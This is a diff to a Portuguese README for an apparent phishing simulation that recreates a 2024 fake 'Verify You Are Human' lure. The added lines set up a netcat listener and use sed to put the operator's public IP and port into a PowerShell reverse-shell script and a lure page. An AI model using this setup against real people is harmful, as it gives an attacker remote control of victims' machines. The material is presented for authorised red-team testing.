@@ -7,6 +7,22 @@
 
 Este código deve ser utilizado em ambiente controlado onde você tenha permissão para realizar o teste de fishing.
 
+Ouça com o netcat em uma porta especifica, lembre de alterar no `sed` abaixo.
+```
+nc -nvlp 999
+```
+
+
+altere no codigo para seu ip publico e a porta que está ouvindo o netcat.
+```
+ip-address=$(curl ip.me)
+sed -i 's/localhost/$ip-address/g' ./revshell.ps1
+sed -i 's/localhost/$ip-address/g' ./index.html
+sed -i 's/port/SuaPortaDoNETCAT/g' ./revshell.ps1
+```
+
+
+
 ![Verify You Are Human](https://github.com/user-attachments/assets/56be51b9-e58d-40e9-bdb1-54bcc11d4180)
 
 Este é uma pequena amostra para recriar a engenharia social e a isca de phishing vista recentemente na natureza por volta de agosto/setembro de 2024.
